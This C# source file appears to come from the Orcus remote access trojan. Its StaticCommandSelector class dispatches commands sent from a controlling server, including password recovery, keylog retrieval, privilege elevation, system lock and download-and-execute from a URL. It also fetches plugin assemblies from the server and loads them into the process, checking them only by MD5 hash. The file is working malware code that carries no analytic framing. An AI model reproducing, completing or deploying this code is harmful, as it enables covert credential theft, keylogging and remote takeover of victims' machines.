using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Connection.Args;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Communication;
using Orcus.Shared.DynamicCommands;
using Orcus.StaticCommands;
using Orcus.StaticCommands.Client;
using Orcus.StaticCommands.Computer;
using Orcus.StaticCommands.Interaction;
using Orcus.StaticCommands.System;

namespace Orcus.StaticCommandManagement
{
    public class StaticCommandSelector
    {
        private readonly List<LoadedStaticCommandPluginInfo> _loadedPlugins;
        private readonly StaticCommandScheduler _staticCommandScheduler;
        private readonly IClientInfo _clientInfo;
        private readonly object _activeCommandsLock = new object();
        private readonly DynamicCommandStore _dynamicCommandStore;
        private readonly ActiveCommandStopScheduler _activeCommandStopScheduler;

        private StaticCommandSelector(IClientInfo clientInfo)
        {
            StaticCommands = new Dictionary<Guid, StaticCommand>(new StaticCommand[]
            {
                new KillCommand(), new MakeAdminCommand(), new PasswordRecoveryCommandEx(),
                new RequestKeyLogCommandEx(), new UninstallCommandEx(), new UpdateCommandEx(),
                new UpdateFromUrlCommandEx(), new ChangeComputerStateCommand(), new ChangeWallpaperCommandEx(),
                new DownloadAndExecuteCommand(), new DownloadAndExecuteFromUrlCommand(),
                new OpenWebsiteCommand(), new ExecuteProcessCommand(), new WakeOnLanCommand(),
                new ShowMessageBoxCommand(), new ShowBalloonTooltipCommand(), new OpenTextInNotepadCommand(),
                new SystemLockCommandEx()
            }.ToDictionary(x => x.CommandId, y => y));

            _staticCommandScheduler = new StaticCommandScheduler();
            _loadedPlugins = new List<LoadedStaticCommandPluginInfo>();
            _clientInfo = clientInfo;
            ActiveCommands = new Dictionary<PotentialCommand, ActiveStaticCommand>();
            _dynamicCommandStore = new DynamicCommandStore();
            _activeCommandStopScheduler = new ActiveCommandStopScheduler();
        }

        public Dictionary<Guid, StaticCommand> StaticCommands { get; }
        public static StaticCommandSelector Current { get; private set; }
        public Dictionary<PotentialCommand, ActiveStaticCommand> ActiveCommands { get; }

        public static void Initialize(IClientInfo clientInfo)
        {
            Current = new StaticCommandSelector(clientInfo);
            Current.Initialize();
        }

        private void Initialize()
        {
            _dynamicCommandStore.Initialize();
            _activeCommandStopScheduler.Initialize(_dynamicCommandStore);
            _staticCommandScheduler.Initialize(ExecutePotentialCommand, _dynamicCommandStore);
        }

        public List<int> GetActiveCommandIds()
        {
            lock (_activeCommandsLock)
                return ActiveCommands.Select(x => x.Key.CallbackId).ToList();
        }

        public void StopActiveCommand(int commandId)
        {
            lock (_activeCommandsLock)
            {
                var activeCommand = ActiveCommands.Where(x => x.Key.CallbackId == commandId).ToList();
                if (activeCommand.Any())
                {
                    var entry = activeCommand.FirstOrDefault();
                    entry.Value.StopExecute();
                    _dynamicCommandStore.RemoveStoredCommand(entry.Key);
                    _activeCommandStopScheduler.CommandManualStop(entry.Key);
                }
            }
        }

        public void ExecuteCommand(PotentialCommand potentialCommand)
        {
            if (!StaticCommands.ContainsKey(potentialCommand.CommandId) &&
                !LoadStaticCommandPlugin(potentialCommand.PluginResourceId, potentialCommand.PluginHash))
                return;

            lock (_activeCommandsLock)
            {
                //if there is already an Active command executing with the id, we return, nothing new to execute
                if (ActiveCommands.Any(x => x.Key.CallbackId == potentialCommand.CallbackId))
                    return;
            }

            if (potentialCommand.ExecutionEvent?.Id > 0) //0 = Immediately execution
            {
                _staticCommandScheduler.AddPotentialCommand(potentialCommand);
            }
            else
            {
                ExecutePotentialCommand(potentialCommand);
            }
        }

        public void ExecuteCommand(Guid guid, byte[] parameter, IFeedbackFactory feedbackFactory)
        {
            StaticCommand staticCommand;
            if (StaticCommands.TryGetValue(guid, out staticCommand))
                staticCommand.Execute(new CommandParameter(parameter), feedbackFactory, _clientInfo);
        }

        private void ExecutePotentialCommand(PotentialCommand potentialCommand)
        {
            StaticCommand staticCommand;
            if (StaticCommands.TryGetValue(potentialCommand.CommandId, out staticCommand))
            {
                var activeStaticCommand = staticCommand as ActiveStaticCommand;
                if (activeStaticCommand != null)
                {
                    //create a new instance because the commands are session based
                    activeStaticCommand = (ActiveStaticCommand) Activator.CreateInstance(activeStaticCommand.GetType());
                    activeStaticCommand.ExecutionStopped += ActiveStaticCommandOnExecutionStopped;

                    //the command is automatically removed
                    if (!_activeCommandStopScheduler.ExecuteActiveCommand(potentialCommand, activeStaticCommand))
                        return;

                    lock (_activeCommandsLock)
                        ActiveCommands.Add(potentialCommand, activeStaticCommand);

                    var serverConnection = (ServerConnection) _clientInfo.ServerConnection;
                    lock (serverConnection.SendLock)
                    {
                        DynamicCommandFeedbackFactory.PushEvent(serverConnection.BinaryWriter,
                            potentialCommand.CallbackId, ActivityType.Active, null);
                    }
                        
                    new Thread(() =>
                    {       
                        try
                        {
                            activeStaticCommand.Execute(new CommandParameter(potentialCommand.Parameter), null,
                                _clientInfo);
                        }
                        catch (Exception)
                        {
                            ActiveStaticCommandOnExecutionStopped(activeStaticCommand, EventArgs.Empty);
                        }
                    }) {IsBackground = true}.Start();
                }
                else
                {
                    var feedbackFactory =
                        new DynamicCommandFeedbackFactory((ServerConnection) _clientInfo.ServerConnection,
                            potentialCommand.CallbackId);

                    new Thread(() =>
                    {
                        try
                        {
                            staticCommand.Execute(new CommandParameter(potentialCommand.Parameter), feedbackFactory,
                                _clientInfo);
                        }
                        catch (Exception ex)
                        {
                            feedbackFactory.Failed("Critical error: " + ex.Message);
                        }

                        //that will execute anyways only if it wasn't pushed yet
                        feedbackFactory.Succeeded();
                    }) {IsBackground = true}.Start();
                }
            }
        }

        private void ActiveStaticCommandOnExecutionStopped(object sender, EventArgs eventArgs)
        {
            var activeStaticCommand = (ActiveStaticCommand) sender;
            PotentialCommand potentialCommand;

            lock (_activeCommandsLock)
            {
                potentialCommand = ActiveCommands.FirstOrDefault(x => x.Value.CommandId == activeStaticCommand.CommandId).Key;
                if (potentialCommand == null)
                    return;

                ActiveCommands.Remove(potentialCommand);
            }
            
            var serverConnection = (ServerConnection) _clientInfo.ServerConnection;
            lock (serverConnection.SendLock)
            {
                DynamicCommandFeedbackFactory.PushEvent(serverConnection.BinaryWriter, potentialCommand.CallbackId,
                    ActivityType.Stopped, null);
            }
        }

        public bool CheckPluginAvailable(byte[] pluginHash)
        {
            //we compare the hash values instead of the ids because every server will have a different id for the plugin
            if (_loadedPlugins.Any(x => x.Hash.SequenceEqual(pluginHash)))
                return true;

            var pluginDirectory = new DirectoryInfo(Consts.StaticCommandPluginsDirectory);
            if (pluginDirectory.Exists)
            {
                foreach (var fileInfo in pluginDirectory.GetFiles("*"))
                {
                    //we don't need to check plugins which are already loaded
                    if (_loadedPlugins.Any(x => x.Filename == fileInfo.FullName))
                        continue;

                    byte[] hash;
                    using (var md5 = new MD5CryptoServiceProvider())
                    using (var fs = fileInfo.OpenRead())
                        hash = md5.ComputeHash(fs);

                    if (hash.SequenceEqual(pluginHash))
                    {
                        InitializePlugin(fileInfo.FullName, pluginHash);
                        return true;
                    }
                }
            }

            return false;
        }

        public bool LoadStaticCommandPlugin(int resourceId, byte[] pluginHash)
        {
            if (resourceId < -1)
                return true;

            if (CheckPluginAvailable(pluginHash))
                return true;

            var serverConnection = (ServerConnection)_clientInfo.ServerConnection;
            var autoResetEvent = new AutoResetEvent(false);
            string pluginFilename = null;

            EventHandler<StaticCommandPluginReceivedEventArgs> handler = (sender, args) =>
            {
                if (args.PluginResourceId == resourceId)
                {
                    pluginFilename = args.Filename;
                    autoResetEvent.Set();
                }
            };

            serverConnection.StaticCommandPluginReceived += handler;

            try
            {
                lock (serverConnection.SendLock)
                {
                    serverConnection.BinaryWriter.Write((byte) FromClientPackage.RequestStaticCommandPlugin);
                    serverConnection.BinaryWriter.Write(4);
                    serverConnection.BinaryWriter.Write(resourceId);
                }

                if (!autoResetEvent.WaitOne(1000*60*5))
                    return false;
            }
            finally
            {
                serverConnection.StaticCommandPluginReceived -= handler;
                autoResetEvent.Close();
            }

            byte[] fileHash;
            using (var md5 = new MD5CryptoServiceProvider())
            using (var fs = File.OpenRead(pluginFilename))
                fileHash = md5.ComputeHash(fs);

            if (fileHash.SequenceEqual(pluginHash))
            {
                InitializePlugin(pluginFilename, pluginHash);
                return true;
            }

            return false;
        }

        private void InitializePlugin(string filename, byte[] hash)
        {
#if NET35
            var pluginData = File.ReadAllBytes(filename);
            var pluginAssembly = Assembly.Load(pluginData);
#else
            var pluginAssembly = Assembly.LoadFile(filename);
#endif

            _loadedPlugins.Add(new LoadedStaticCommandPluginInfo(filename, hash));
            var types = pluginAssembly.GetTypes();
            foreach (var staticCommandType in types.Where(x => x.IsSubclassOf(typeof (StaticCommand)) && x.GetConstructor(Type.EmptyTypes) != null))
            {
                var staticCommand = (StaticCommand) Activator.CreateInstance(staticCommandType);
                StaticCommands.Add(staticCommand.CommandId, staticCommand);
            }
        }
    }
}